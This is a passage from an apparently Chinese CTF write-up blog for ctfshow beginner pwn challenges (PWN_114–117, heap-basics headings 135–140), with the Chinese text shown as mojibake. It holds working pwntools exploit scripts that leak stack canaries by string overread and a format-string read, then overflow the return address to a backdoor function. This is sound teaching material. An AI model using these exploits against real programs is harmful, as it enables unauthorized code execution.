		data-flex-grow="523"
		data-flex-basis="1255px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/418.png"
	width="574"
	height="134"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/418_hu_19fda852ca500147.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/418_hu_5a03fce725cb124d.png 1024w"
	loading="lazy"
	
		alt="å…³é”®getshellå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="428"
		data-flex-basis="1028px"
	
></p>
<p><strong>ç¨‹åºå®šä¹‰äº†ä¸€ä¸ªä¿¡å·é‡ï¼Œå½“å‡ºç°è¿™ä¸ªä¿¡å·é‡ï¼ˆéæ³•å†…å­˜è®¿é—®ï¼‰çš„æ—¶å€™ï¼Œä¼šæ‰§è¡ŒSIG_IGN</strong>ï¼Œ<strong>å³å½“æˆ‘ä»¬éæ³•å†…å­˜è®¿é—®çš„æ—¶å€™ï¼Œä¼šå¿½ç•¥æ­¤ä¿¡å·</strong>ï¼Œå½“æˆ‘ä»¬éæ³•å†…å­˜è®¿é—®çš„æ—¶å€™ï¼Œä¼šå°†æˆ‘ä»¬çš„flagé€šè¿‡æ ‡å‡†é”™è¯¯æ‰“å°å‡ºæ¥<code>(fflush(stderr));</code></p>
<p>æ ˆæº¢å‡ºè§¦å‘åç›´æ¥è¾“å‡ºflagå­—ç¬¦ä¸²ï¼Œé¢˜éå¸¸ç®€å•ï¼Œæº¢å‡ºåå³å¯è·å¾—flagã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/417.png"
	width="1646"
	height="670"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/417_hu_4b45f9cbaf233458.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/417_hu_6098538049687219.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<p>è¾“å…¥Yeså®Œåç›´æ¥æ‰‹æ•²0x100ä¸ªAç»™ç¨‹åºå°±è¡Œäº†ï¼Œexpéƒ½çœäº†ğŸ˜„ã€‚</p>
<h3 id="pwn_115">PWN_115
</h3><p>é¢˜ç›®ï¼šBypass Canary å§¿åŠ¿1ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/419.png"
	width="710"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/419_hu_7cfafbd2ec1d441c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/419_hu_e7f2e2930b8d3df9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="355"
		data-flex-basis="852px"
	
></p>
<p>32ä½å¼€å¯äº†Canaryä¿æŠ¤ä¸NXä¿æŠ¤ï¼Œéƒ¨åˆ†å¼€å¯RELROä¿æŠ¤ã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/420.png"
	width="764"
	height="166"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/420_hu_7d4e577c0c5ce140.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/420_hu_d1a53dcbec9aed53.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="460"
		data-flex-basis="1104px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/421.png"
	width="668"
	height="310"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/421_hu_2c0b823b892ad049.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/421_hu_e6f863e359cdacfd.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="215"
		data-flex-basis="517px"
	
></p>
<p>æœ‰ä¸¤æ¬¡readå‡½æ•°è°ƒç”¨ä¸”æœ‰æ˜æ˜¾çš„æº¢å‡ºæ¼æ´è¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/422.png"
	width="515"
	height="110"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/422_hu_eaa0d334a612dacc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/422_hu_d6b7224e02d3033d.png 1024w"
	loading="lazy"
	
		alt="åé—¨å‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="468"
		data-flex-basis="1123px"
	
></p>
<p>æˆ‘ä»¬å¯ä»¥å¡«å……ç¼“å­˜åŒºåˆšå¥½200é•¿åº¦ï¼Œæ­£å¥½æŠŠ<code>\x00</code>ç»“æŸç¬¦ç»™è¦†ç›–äº†ï¼Œprintfå‡½æ•°å°±ä¼šä¸€ç›´æ‰“å°ï¼Œåˆšå¥½æŠŠcanaryå€¼æ‰“å°å‡ºæ¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xa</span> <span class="c1">#(0xa)æ˜¯æ¢è¡Œç¬¦\nçš„ASCIIï¼Œè¿™ä¸€æ®µä»£ç å°±æ˜¯é™¤å»æ¢è¡Œç¬¦ï¼Œä¿ç•™çº¯å‡€çš„canaryå€¼ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Canary:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28212</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Try Bypass Me!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xa</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Canary:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">200</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_116">PWN_116
</h3><p>é¢˜ç›®ï¼šBypass Canary å§¿åŠ¿2</p>
<p>checksecæ£€æŸ¥ä¿æŠ¤æœºåˆ¶ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/447.png"
	width="634"
	height="203"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/447_hu_ed5cfb572dfb753d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/447_hu_d44098fa32ef0961.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="312"
		data-flex-basis="749px"
	
></p>
<p>32ä½å¼€å¯äº†Canaryä¿æŠ¤ä¸NXä¿æŠ¤ï¼Œéƒ¨åˆ†å¼€å¯RELROä¿æŠ¤ã€‚</p>
<p>IDA32ä½åˆ†æ:</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/448.png"
	width="575"
	height="96"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/448_hu_e1ea58df929a35b4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/448_hu_22b51180897ef5b2.png 1024w"
	loading="lazy"
	
		alt="åé—¨å‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="598"
		data-flex-basis="1437px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/446.png"
	width="726"
	height="264"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/446_hu_71a7977d4a5d06c2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/446_hu_45cf8e61bedb38b3.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="275"
		data-flex-basis="660px"
	
></p>
<p>è¿™é¢˜è¿˜æ˜¯è¦æ±‚æˆ‘ä»¬ç»•è¿‡canaryä¿æŠ¤å»åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p>å“è¿™é¢˜è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œæˆ‘ä¸æƒ³å¤šè¯´äº†ï¼Œæ€è·¯å’Œå‚æ•°éƒ½å·®ä¸å¤šï¼Œexp1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28289</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">qwerasd</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;qwerasd&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Look me &amp; use me!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xa</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2C</span><span class="o">-</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">qwerasd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå±•ç¤ºç¬¬äºŒç§æ–¹æ³•ï¼Œåˆ©ç”¨FMTå»æ³„éœ²canaryå€¼ã€‚</p>
<p>è¿”å›IDAçœ‹æ±‡ç¼–ä»£ç å—ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/449.png"
	width="951"
	height="661"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/449_hu_b83aab9e726a4e66.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/449_hu_a0e9f4281355272c.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="345px"
	
></p>
<p>è¿™é‡Œå°±æ˜¯canaryå‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">var_C</span> <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">0Ch</span>  <span class="c1">; Canaryçš„æ ˆåç§»ï¼ˆç›¸å¯¹äºebpï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nv">large</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">14h</span>  <span class="c1">; ä»GSæ®µè¯»å–Canary</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="nb">eax</span>   <span class="c1">; å°†Canaryå­˜å…¥æ ˆä¸Šçš„var_Cä½ç½®</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>â†’ <strong>Canary ä½äº <code>ebp-0xC</code> çš„ä½ç½®</strong>ï¼ˆ32 ä½ç¨‹åºï¼Œå  4 å­—èŠ‚ï¼‰ã€‚</p>
<p>gdbè°ƒè¯•æ‰¾æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»é‡ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/450.png"
	width="1819"
	height="849"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/450_hu_3801fe16db2b5aec.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/450_hu_f8dcd6fdc014e668.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="514px"
	
></p>
<p>ç»™ctfshowå‡½æ•°æ–­ç‚¹ï¼Œrå¯åŠ¨ã€‚</p>
<p>æ¥ç€niæ­¥è¿›åˆ°readå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/451.png"
	width="1829"
	height="848"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/451_hu_c435e6d0f9858586.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/451_hu_70488ea565d0cd47.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="215"
		data-flex-basis="517px"
	
></p>
<p>è¾“å…¥AAAAï¼Œå­˜è¿›æ ˆé‡Œã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/452.png"
	width="1918"
	height="853"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/452_hu_4f05442a37a6e9b0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/452_hu_6f92f9619a63a331.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="539px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°AAAAå­˜è¿›æ ˆäº†ï¼Œæ¥ä¸‹æ¥stack 50å‘½ä»¤çœ‹æ ˆï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/453.png"
	width="1746"
	height="854"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/453_hu_204271ecb8e8ae00.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/453_hu_ea5811c49f92853d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="490px"
	
></p>
<p>ä¼¼ä¹æ²¡æ‰¾åˆ°canaryåœ°å€ï¼Œæ‡’å¾—ä¸€ä¸ªä¸ªçœ‹äº†ï¼Œè¾“å…¥æŒ‡ä»¤ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">p $ebp - 0xC   # å¾—åˆ°çœŸæ­£çš„Canaryåœ°å€ï¼ˆå¦‚0xffffcdf4ï¼‰
</span></span><span class="line"><span class="cl">x/wx $ebp - 0xC# æŸ¥çœ‹æœ‰æ•ˆCanaryå€¼ï¼ˆå¦‚0x12345600ï¼Œæœ«å°¾0x00ï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/454.png"
	width="1500"
	height="573"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/454_hu_f75470c2a8a47fff.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/454_hu_ee5b48f220ee3f02.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="628px"
	
></p>
<p>åç§»é‡æ˜¯15ã€‚</p>
<p>é‚£æˆ‘ä»¬å°±ç»™è¯»å–<code>%15$08x</code>åˆ°bufï¼Œæ¥ç€printfåˆä¼šè¯»å–è¿™ä¸ª<code>%15$08x</code>ï¼Œæ°å¥½æŠŠcanaryå€¼æ‰“å°å‡ºæ¥ç»™æˆ‘ä»¬æ¥æ”¶ğŸ˜„ã€‚</p>
<p>exp2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28289</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">qwerasd</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;qwerasd&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Look me &amp; use me!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%15$08x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Canary</span> <span class="o">=</span> <span class="n">canary</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="n">Canary</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2C</span><span class="o">-</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">qwerasd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_117">PWN_117
</h3><p>é¢˜ç›®ï¼šBypass Canary å§¿åŠ¿3ã€‚</p>
<h2 id="å †å‰ç½®åŸºç¡€">å †å‰ç½®åŸºç¡€
</h2><p>å‰è¨€ï¼šä¸ºé˜²æ­¢é¢˜ç›®éš¾åº¦è·¨åº¦å¤ªå¤§ï¼Œ135-140ä¸ºæ¼”ç¤ºé¢˜ç›®é˜¶æ®µï¼Œä½ å¯ä»¥è½»æ¾è·å–flag,ä½†æ˜¯å¸Œæœ›ä½ èƒ½ä¸€æ­¥æ­¥å»è°ƒè¯•ï¼Œè€Œä¸æ˜¯ä»…ä»…å»æ‹¿åˆ°flagã€‚</p>
<h3 id="pwn_135">PWN_135
</h3><p>é¢˜ç›®ï¼šå¦‚ä½•ç”³è¯·å †ï¼Ÿ</p>
<p>è¿™é¢˜ä¸»è¦æ˜¯è®©æˆ‘ä»¬çŸ¥é“<strong>reallocï¼Œcallocï¼Œmalloc</strong>ä¸‰ä¸ªå‡½æ•°çš„ä½œç”¨è‡ªå·±ç”¨gdbè°ƒè¯•å°±è¡Œäº†ã€‚</p>
<p><a class="link" href="https://www.cnblogs.com/codemagiciant/p/17526826.html"  target="_blank" rel="noopener"
    >57.mallocã€reallocã€callocçš„åŒºåˆ« - CodeMagicianT - åšå®¢å›­</a></p>
<h3 id="pwn_136">PWN_136
</h3><p>é¢˜ç›®ï¼šå¦‚ä½•é‡Šæ”¾å †ï¼Ÿ</p>
<h3 id="pwn_137">PWN_137
</h3><p>é¢˜ç›®ï¼šsbrk and brk exampleã€‚</p>
<h3 id="pwn_138">PWN_138
</h3><p>é¢˜ç›®ï¼šPrivate anonymous mapping examplã€‚</p>
<h3 id="pwn_139">PWN_139
</h3><p>é¢˜ç›®ï¼šæ¼”ç¤ºå°†flagå†™å…¥å †ä¸­å¹¶è¾“å‡ºå…¶å†…å®¹ã€‚</p>
<h5 id="">
</h5><h3 id="pwn_140">PWN_140
</h3><p>é¢˜ç›®ï¼šå¤šçº¿ç¨‹æ”¯æŒã€‚</p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-12-04
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
